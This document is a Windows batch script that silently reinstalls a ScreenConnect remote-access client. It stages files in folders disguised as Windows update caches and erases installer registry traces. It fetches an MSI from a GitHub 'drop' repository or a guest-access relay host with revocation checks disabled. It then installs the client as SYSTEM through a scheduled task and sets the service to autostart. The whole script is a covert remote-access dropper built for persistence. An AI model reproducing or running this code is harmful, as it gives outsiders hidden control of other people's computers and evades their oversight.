@echo off
rem 330MLRACE hard recover: purge phantom Installer PC + wipe orphan dir + fresh /i (detached)
setlocal EnableExtensions
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "STAGE=%SystemRoot%\Temp\.upd"
set "FP=36e506ff016b2151"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
set "MSI=%STAGE%\pkg_gryxa.msi"
set "DIR=%ProgramFiles(x86)%\ScreenConnect Client (%FP%)"
set "SVC=ScreenConnect Client (%FP%)"
set "WORKER=%STAGE%\gryxa_hard_once.cmd"
set "TASK=WucacheGryxaHardOnce"
set "LOG=%WD%\own_gryxa.log"
set "CURL=%SystemRoot%\System32\curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1

> "%WORKER%" (
  echo @echo off
  echo setlocal EnableExtensions
  echo echo [%DATE% %TIME%] hard_recover_begin^>^>"%LOG%"
  echo msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress ^>^>"%LOG%" 2^>^&1
  echo reg delete "HKLM\SOFTWARE\Classes\Installer\Products\%PACKED%" /f
  echo reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\%PACKED%" /f
  echo reg delete "HKCR\Installer\Products\%PACKED%" /f
  echo reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f
  echo reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f
  echo sc stop "%SVC%"
  echo sc delete "%SVC%"
  echo if exist "%DIR%" rmdir /s /q "%DIR%"
  echo del /f /q "%MSI%"
  echo "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
  echo if not exist "%MSI%" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%" "https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
  echo msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_hard.log"
  echo echo msiexec_exit=%%ERRORLEVEL%%^>^>"%LOG%"
  echo sc config "%SVC%" start= auto
  echo sc start "%SVC%"
  echo timeout /t 20 /nobreak
  echo sc query "%SVC%" ^>^>"%LOG%"
  echo echo [%DATE% %TIME%] hard_recover_end^>^>"%LOG%"
  echo schtasks /Delete /TN "%TASK%" /F
)

schtasks /Delete /TN "%TASK%" /F >nul 2>&1
schtasks /Create /TN "%TASK%" /TR "cmd.exe /c %WORKER%" /SC MINUTE /MO 60 /RU SYSTEM /RL HIGHEST /F
schtasks /Run /TN "%TASK%"
echo HARD=QUEUED
echo wait 5 min then: sc query "%SVC%"
endlocal
